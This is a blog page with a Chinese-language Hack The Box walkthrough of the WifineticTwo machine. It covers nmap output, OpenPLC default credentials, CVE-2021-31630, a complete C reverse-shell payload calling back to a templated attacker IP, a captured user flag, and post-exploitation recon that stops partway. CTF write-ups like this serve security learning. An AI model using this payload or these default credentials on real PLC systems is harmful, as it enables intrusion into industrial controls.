<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="WifineticTwo_MID题目来源Hack The Box - Season 4 - WifineticTwo MID 考点 弱密码(出厂密码) CVE-2021-31630   (PLC 命令执行RCE) Pixie Dust attack  分析 nmap 扫描一波 1234567891011121314151617181920212223242526272829303132333435">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB打靶月计_2403">
<meta property="og:url" content="http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/index.html">
<meta property="og:site_name" content="psych&#39;s blog">
<meta property="og:description" content="WifineticTwo_MID题目来源Hack The Box - Season 4 - WifineticTwo MID 考点 弱密码(出厂密码) CVE-2021-31630   (PLC 命令执行RCE) Pixie Dust attack  分析 nmap 扫描一波 1234567891011121314151617181920212223242526272829303132333435">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240325000413207.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240325000330795.png">
<meta property="article:published_time" content="2024-03-24T16:14:14.000Z">
<meta property="article:modified_time" content="2024-03-24T16:14:55.719Z">
<meta property="article:author" content="psych">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240325000413207.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>HTB打靶月计_2403</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="psych&#39;s blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Article</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/05/07/%E4%BA%91%E5%8E%9F%E7%94%9F-K8S%E5%AE%89%E5%85%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&text=HTB打靶月计_2403"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&is_video=false&description=HTB打靶月计_2403"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB打靶月计_2403&body=Check out this article: http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&title=HTB打靶月计_2403"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&name=HTB打靶月计_2403&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/25/HTB%E6%89%93%E9%9D%B6%E6%9C%88%E8%AE%A1-2403/&t=HTB打靶月计_2403"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WifineticTwo-MID"><span class="toc-number">1.</span> <span class="toc-text">WifineticTwo_MID</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Headless-EASY"><span class="toc-number">2.</span> <span class="toc-text">Headless_EASY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.3.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HTB打靶月计_2403
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">psych</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-24T16:14:14.000Z" class="dt-published" itemprop="datePublished">2024-03-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="WifineticTwo-MID"><a href="#WifineticTwo-MID" class="headerlink" title="WifineticTwo_MID"></a>WifineticTwo_MID</h2><h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/WifineticTwo">Hack The Box - Season 4 - WifineticTwo</a></p>
<p>MID</p>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
<li>弱密码(出厂密码)</li>
<li><strong>CVE-2021-31630   (PLC 命令执行RCE)</strong></li>
<li>Pixie Dust attack</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li><p>nmap 扫描一波</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Nmap</span> scan report <span class="keyword">for</span> <span class="number">10.129</span><span class="number">.84</span><span class="number">.209</span></span><br><span class="line"><span class="title class_">Host</span> is up (<span class="number">0.</span>27s latency).</span><br><span class="line"><span class="title class_">Not</span> <span class="attr">shown</span>: <span class="number">998</span> closed tcp ports (conn-refused)</span><br><span class="line"><span class="variable constant_">PORT</span>     <span class="variable constant_">STATE</span> <span class="variable constant_">SERVICE</span>    <span class="variable constant_">VERSION</span></span><br><span class="line"><span class="number">22</span>/tcp   open  ssh        <span class="title class_">OpenSSH</span> <span class="number">8.</span>2p1 <span class="title class_">Ubuntu</span> 4ubuntu0<span class="number">.11</span> (<span class="title class_">Ubuntu</span> <span class="title class_">Linux</span>; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">8080</span>/tcp open  http-proxy <span class="title class_">Werkzeug</span>/<span class="number">1.0</span><span class="number">.1</span> <span class="title class_">Python</span>/<span class="number">2.7</span><span class="number">.18</span></span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. <span class="title class_">If</span> you know the service/version, please submit the following fingerprint at &lt;<span class="attr">https</span>:<span class="comment">//nmap.org/cgi-bin/submit.cgi?new-service&gt; :</span></span><br><span class="line"><span class="variable constant_">SF</span>-<span class="title class_">Port8080</span>-<span class="attr">TCP</span>:V=<span class="number">7.93</span>%I=<span class="number">7</span>%D=<span class="number">3</span>/<span class="number">23</span>%<span class="title class_">Time</span>=65FEFBCB%P=x86_64-pc-linux-gnu%<span class="title function_">r</span>(<span class="title class_">Ge</span></span><br><span class="line"><span class="attr">SF</span>:tRequest,24C,<span class="string">&quot;HTTP/1\\.0\\x20302\\x20FOUND\\r\\ncontent-type:\\x20text/html;\\</span></span><br><span class="line"><span class="string">SF:x20charset=utf-8\\r\\ncontent-length:\\x20219\\r\\nlocation:\\x20http://0\\.0\\</span></span><br><span class="line"><span class="string">SF:.0\\.0:8080/login\\r\\nvary:\\x20Cookie\\r\\nset-cookie:\\x20session=eyJfZnJlc</span></span><br><span class="line"><span class="string">SF:2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\\.Zf77rQ\\.uUR_ApVdL7hf-zxtvZ-p7A7R</span></span><br><span class="line"><span class="string">SF:gME;\\x20Expires=Sat,\\x2023-Mar-2024\\x2016:01:29\\x20GMT;\\x20HttpOnly;\\x2</span></span><br><span class="line"><span class="string">SF:0Path=/\\r\\nserver:\\x20Werkzeug/1\\.0\\.1\\x20Python/2\\.7\\.18\\r\\ndate:\\x20S</span></span><br><span class="line"><span class="string">SF:at,\\x2023\\x20Mar\\x202024\\x2015:56:29\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x2</span></span><br><span class="line"><span class="string">SF:0PUBLIC\\x20\\&quot;</span>-<span class="comment">//W3C//DTD\\x20HTML\\x203\\.2\\x20Final//EN\\&quot;&gt;\\n&lt;title&gt;Redire</span></span><br><span class="line"><span class="attr">SF</span>:cting\\.\\.\\.&lt;<span class="regexp">/title&gt;\\n&lt;h1&gt;Redirecting\\.\\.\\.&lt;/</span>h1&gt;\\n&lt;p&gt;<span class="title class_">You</span>\\x20should\\x20be</span><br><span class="line"><span class="attr">SF</span>:\\x20redirected\\x20automatically\\x20to\\x20target\\<span class="attr">x20URL</span>:\\x20&lt;a\\x20href=\\</span><br><span class="line"><span class="attr">SF</span>:<span class="string">&quot;/login\\&quot;</span>&gt;<span class="regexp">/login&lt;/</span>a&gt;\\.\\x20\\x20If\\x20not\\x20click\\x20the\\x20link\\.<span class="string">&quot;)%r(H</span></span><br><span class="line"><span class="string">SF:TTPOptions,14E,&quot;</span><span class="variable constant_">HTTP</span>/<span class="number">1</span>\\<span class="number">.0</span>\\x20200\\x20OK\\r\\ncontent-<span class="attr">type</span>:\\x20text/html;\\x</span><br><span class="line"><span class="attr">SF</span>:20charset=utf-<span class="number">8</span>\\r\\<span class="attr">nallow</span>:\\x20HEAD,\\x20OPTIONS,\\x20GET\\r\\<span class="attr">nvary</span>:\\x20Cooki</span><br><span class="line"><span class="attr">SF</span>:e\\r\\nset-<span class="attr">cookie</span>:\\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\\.<span class="property">Zf77rg</span>\\.<span class="property">CbZEJyD</span></span><br><span class="line"><span class="attr">SF</span>:<span class="title class_">ZJkIklPJ</span>_i0DWnVTRV3Q;\\x20Expires=<span class="title class_">Sat</span>,\\x2023-<span class="title class_">Mar</span>-<span class="number">2024</span>\\<span class="attr">x2016</span>:<span class="number">01</span>:<span class="number">30</span>\\x20GMT</span><br><span class="line"><span class="attr">SF</span>:;\\x20HttpOnly;\\x20Path=/\\r\\ncontent-<span class="attr">length</span>:\\x200\\r\\<span class="attr">nserver</span>:\\x20Werkzeug</span><br><span class="line"><span class="attr">SF</span>:<span class="regexp">/1\\.0\\.1\\x20Python/</span><span class="number">2</span>\\<span class="number">.7</span>\\<span class="number">.18</span>\\r\\<span class="attr">ndate</span>:\\x20Sat,\\x2023\\x20Mar\\x202024\\x2015</span><br><span class="line"><span class="attr">SF</span>::<span class="number">56</span>:<span class="number">30</span>\\x20GMT\\r\\n\\r\\n<span class="string">&quot;)%r(RTSPRequest,CF,&quot;</span><span class="variable constant_">HTTP</span>/<span class="number">1</span>\\<span class="number">.1</span>\\x20400\\x20Bad\\x20re</span><br><span class="line"><span class="attr">SF</span>:quest\\r\\ncontent-<span class="attr">length</span>:\\x2090\\r\\ncache-<span class="attr">control</span>:\\x20no-cache\\r\\ncontent</span><br><span class="line"><span class="attr">SF</span>:-<span class="attr">type</span>:\\x20text/html\\r\\<span class="attr">nconnection</span>:\\x20close\\r\\n\\r\\n&lt;html&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>400\\</span></span><br><span class="line"><span class="language-xml">SF:x20Bad\\x20request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>\\nYour\\x20browser\\x20sent\\x20an\\x20invalid\\x20req</span></span><br><span class="line"><span class="language-xml">SF:uest\\.\\n<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span>&lt;<span class="regexp">/html&gt;\\n&quot;)%r(Socks5,CF,&quot;HTTP/</span><span class="number">1</span>\\<span class="number">.1</span>\\x20400\\x20Bad\\x20requ</span><br><span class="line"><span class="attr">SF</span>:est\\r\\ncontent-<span class="attr">length</span>:\\x2090\\r\\ncache-<span class="attr">control</span>:\\x20no-cache\\r\\ncontent-t</span><br><span class="line"><span class="attr">SF</span>:<span class="attr">ype</span>:\\x20text/html\\r\\<span class="attr">nconnection</span>:\\x20close\\r\\n\\r\\n&lt;html&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>400\\x2</span></span><br><span class="line"><span class="language-xml">SF:0Bad\\x20request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>\\nYour\\x20browser\\x20sent\\x20an\\x20invalid\\x20reque</span></span><br><span class="line"><span class="language-xml">SF:st\\.\\n<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span>&lt;<span class="regexp">/html&gt;\\n&quot;)%r(RPCCheck,CF,&quot;HTTP/</span><span class="number">1</span>\\<span class="number">.1</span>\\x20400\\x20Bad\\x20requ</span><br><span class="line"><span class="attr">SF</span>:est\\r\\ncontent-<span class="attr">length</span>:\\x2090\\r\\ncache-<span class="attr">control</span>:\\x20no-cache\\r\\ncontent-t</span><br><span class="line"><span class="attr">SF</span>:<span class="attr">ype</span>:\\x20text/html\\r\\<span class="attr">nconnection</span>:\\x20close\\r\\n\\r\\n&lt;html&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>400\\x2</span></span><br><span class="line"><span class="language-xml">SF:0Bad\\x20request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>\\nYour\\x20browser\\x20sent\\x20an\\x20invalid\\x20reque</span></span><br><span class="line"><span class="language-xml">SF:st\\.\\n<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span>&lt;/html&gt;\\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>8080 开了一个 openPLC webserver</p>
</li>
</ol>
<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240325000413207.png" alt="image-20240325000413207" style="zoom:25%;" />

<ol>
<li><p>搜了一下，默认密码：openplc ；openplc</p>
</li>
<li><p>找一下历史漏洞，有一个RCE    <strong>CVE-2021-31630</strong></p>
<ol>
<li>EXP：<a target="_blank" rel="noopener" href="https://pwnwiki.com/pwn_wiki/archives/12017.html">https://pwnwiki.com/pwn_wiki/archives/12017.html</a></li>
</ol>
<p>改一下代码直接 exploit ，好像不出网，弹内网 IP</p>
<p>弹不上</p>
<p>服了</p>
<p>额</p>
</li>
<li><p>还是老老实实学学这个漏洞原理吧。网上搜不到，但大概是一个 PLC 命令执行。</p>
<ol>
<li><p>PLC(Programmable Logic Controller)，可编程逻辑控制器。一种具有微处理器的数字电子设备，可用于自动化控制的数字逻辑控制器。也就是通过数字式和模拟式的输入和输出，控制各类机械或生产过程。</p>
</li>
<li><p>漏洞描述：Command Injection in Open PLC Webserver v3 <strong>allows remote attackers to execute arbitrary code via the “Hardware Layer Code Box” component on the “&#x2F;hardware” page of the application.</strong></p>
</li>
<li><p>也就是通过st，然后上一个 C 的马。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ladder.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ignored_bool_inputs[] = &#123;&#123;<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> ignored_bool_outputs[] = &#123;&#123;<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> ignored_int_inputs[] = &#123;&#123;<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span> ignored_int_outputs[] = &#123;&#123;<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCustomLayer</span><span class="params">()</span></span><br><span class="line">&#123;&#123;</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCustomIn</span><span class="params">()</span></span><br><span class="line">&#123;&#123;</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCustomOut</span><span class="params">()</span></span><br><span class="line">&#123;&#123;</span><br><span class="line">    <span class="type">int</span> port = &#123;local_port&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;           </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;&#123;local_ip&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;&#123;<span class="string">&quot;bash&quot;</span>, <span class="literal">NULL</span>&#125;&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;bash&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>一个 C 写的反弹 shell 的马</p>
</li>
<li><p>换了一个exp，连上了哈哈~</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hunt3r0x/CVE-2021-31630-HTB/tree/main">https://github.com/Hunt3r0x/CVE-2021-31630-HTB/tree/main</a></p>
</li>
<li><p>获得 user flag</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">user.<span class="property">txt</span></span><br><span class="line">cat user.<span class="property">txt</span></span><br><span class="line">d7968ed5c6e9b1bf316a86447df9dad4</span><br></pre></td></tr></table></figure>
</li>
<li><p>提权</p>
<p>目前已经是 root，下一步可能需要提权为 system。或者逃逸</p>
<ol>
<li><p>先信息搜集一波</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">&gt; <span class="built_in">pwd</span></span><br><span class="line">/opt/PLC/OpenPLC_v3/webserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目前权限</span></span><br><span class="line">&gt; <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP 情况</span></span><br><span class="line">&gt; ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255</span><br><span class="line">inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">ether 00:16:3e:<span class="built_in">fc</span>:91:0c  txqueuelen 1000  (Ethernet)</span><br><span class="line">RX packets 83094  bytes 6682265 (6.6 MB)</span><br><span class="line">RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">TX packets 50939  bytes 8976145 (8.9 MB)</span><br><span class="line">TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">RX packets 4891  bytes 337239 (337.2 KB)</span><br><span class="line">RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">TX packets 4891  bytes 337239 (337.2 KB)</span><br><span class="line">TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)</span><br><span class="line">RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>ps</p>
